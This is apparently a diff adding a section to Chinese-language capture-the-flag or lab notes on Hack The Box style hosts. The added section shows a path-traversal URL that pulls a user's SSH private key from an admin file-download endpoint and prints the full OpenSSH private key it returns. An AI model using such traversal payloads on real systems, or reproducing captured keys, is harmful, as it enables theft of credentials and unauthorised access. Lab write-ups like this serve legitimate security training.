@@ -134,3 +134,20 @@ IDOR（Insecure Direct Object Reference，不安全的直接对象引用）是�
 ```bash
 sudo bash -c 'echo "10.129.187.74 conversor.htb" >> /etc/hosts'
 ```
+
+### 关于 id_rsa
+
+访问 `http://facts.htb/admin/media/download_private_file?file=../../../../../../home/trivia/id_ed25519` 尝试下载他们的 `id_rsa` 文件
+
+```id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDPFoJGv5
+iCd2KL8Mk98VRJAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIIJhikYx00CYMUNJ
+bkfs15NSAgTKVW07Aw2N4nxQ/RZ6AAAAoAj0NoVnW97AXPxNpphTUEKgehTfW3KWvX/9ps
+AvdkbwNKeW1F/CkRpsFkmcc1/cvTrzBueLfuJI/2Cm8RB55xHgkJNtkk9Fc3HLRF8Z/kZC
+Mn8NP3Z2qOuHzSO5yoqU2mFiFBouc56nWkR50JElA2z0L65KU81xDPB3YVujEf/yxbvoxJ
+ElX+bGho7xDsCOubcJxarL+rGEZ5DQTxpAjGk=
+-----END OPENSSH PRIVATE KEY-----
+```
+
+值得注意的是，下载 `id_rsa` 是失败的，需要下载 `id_ed25519`；`id_ed25519` 是现代 SSH 推荐的 Ed25519 算法私钥文件。
